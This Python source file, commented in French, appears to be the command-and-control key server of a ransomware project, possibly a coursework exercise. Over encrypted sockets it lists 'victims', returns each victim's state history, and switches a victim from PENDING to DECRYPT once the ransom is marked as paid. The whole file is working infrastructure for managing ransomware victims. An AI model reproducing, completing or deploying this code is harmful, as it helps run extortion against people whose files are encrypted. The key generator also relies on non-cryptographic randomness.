import socket
import datetime
import utile.network as network
import utile.message as message
import utile.data as data
import random
import string
import utile.security as security


def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    """
    Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
    :param longueur: La longueur de la clé à générer
    :param caracteres: Les caractères qui composeront la clé
    :return: La clé générée
    """
    return ''.join(random.choice(caracteres) for _ in range(longueur))

def main():
    # Démarrer le serveur
    socket_server = network.start_net_serv()
    # Initialiser la base de données
    conn = data.connect_db()
    if conn is not None:
        print("Base de données initialisée")
    # Attendre une connexion
    print("En attente de connexion...")
    print(f"Connexion de {network.LOCAL_IP} sur le port {network.PORT_SERV_CLES} acceptée")
    print("En attente de messages...")
    while True:
        client_socket, address = socket_server.accept()
        key = security.diffie_hellman_recv_key(client_socket)
        print(f"Clé de chiffrement reçue : {key}")
        encrypted_message_console = network.receive_message(client_socket)
        message_console = security.aes_decrypt(encrypted_message_console, key)
        # Si aucun message n'est reçu, fermer la connexion avec ce client et attendre le suivant
        if message_console is None:
            print("Aucun message reçu, connexion fermée.")
            client_socket.close()
            continue  # Attendre le prochain client
        # Afficher le message reçu
        print(f"Message reçu: {message_console}")
        print(f"Message de type: {message.get_message_type(message_console)}")
        type_message = message.get_message_type(message_console)
        # Traiter le message reçu de type LIST_REQ
        if type_message == "LIST_REQ":
            victims = data.get_list_victims(conn)
            # Envoi de la réponse de type LIST_VICTIM_RESP (pour chaque victime)
            for i in range(len(victims)):
                victime = victims[i]
                # Envoi de la réponse de type LIST_VICTIM_RESP
                message_response = message.set_message("LIST_VICTIM_RESP", victime)
                print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                network.send_message(client_socket, message_response)
                print("Message envoyé")
                # Envoi de la réponse de type LIST_VICTIM_END
                if i == len(victims)-1:
                    message_response = message.set_message("LIST_VICTIM_END")
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
        # Traiter le message reçu de type HIST_REQ
        elif type_message == "HIST_REQ":
            #Decryptage de encrypted_id
            encrypted_id = network.receive_message(client_socket)
            victim_id = security.aes_decrypt(encrypted_id, key)
            # Récupérer l'historique en fonction de l'id de la victime
            history = data.get_list_history(conn, victim_id)
            # Envoi de la réponse de type HISTORY_RESP (pour chaque élément de l'historique)
            for i in range(len(history)):
                message_response = message.set_message("HISTORY_RESP", history[i])
                print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                network.send_message(client_socket, message_response)
                print("Message envoyé")
                # Envoi de la réponse de type HISTORY_END
                if i == len(history)-1:
                    message_response = message.set_message("HISTORY_END")
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
        # Traiter le message reçu de type CHGSTATE
        elif type_message == "CHGSTATE":
            #Decryptage de l'id de la victime
            encrypted_id = network.receive_message(client_socket)
            victim_id = security.aes_decrypt(encrypted_id, key)
            # récupérer l'état actuel en fonction de l'id de la victime
            history = data.get_list_history(conn, victim_id)
            if len(history) > 0:
                # Récupérer le dernier état de la victime
                state = history[-1][3]
                # Si l'état est PENDING, changer l'état de la victime en DECRYPT
                if state == "PENDING":
                    # Changer l'état de la victime
                    items = ["id_states", "id_victim", "datetime", "state"]
                    contenu = [4, victim_id, datetime.datetime.now().timestamp(), "DECRYPT"]
                    data.insert_data(conn, "states", items, contenu)
                    print(f"Changement d'état pour la victime {victim_id} : PENDING -> DECRYPT")
                    message_response = message.set_message("CHANGE_STATE", ["DECRYPT"])
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
                # Si l'état est DECRYPT, changer l'état de la victime en DECRYPTED
                elif state == "DECRYPT":
                    print(f"La victime {victim_id} a payé la rançon et est déja décryptée.")
                    message_response = message.set_message("CHANGE_STATE", ["DECRYPTED"])
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
                # Si l'état est différent de pending ou decrypt, afficher ce message
                else:
                    print(f"La victime {victim_id} est déjà dans l'état {state}.")
                    message_response = message.set_message("CHANGE_STATE", [state])
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
            # Si la victime n'a pas d'historique, afficher ce message
            else:
                print(f"La victime {victim_id} n'a pas d'historique.")
                message_response = message.set_message("CHANGE_STATE", ["UNKNOWN"])
                print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                network.send_message(client_socket, message_response)
                print("Message envoyé")
        else:
            print("Aucun message à envoyer.")


if __name__ == '__main__':
    main()
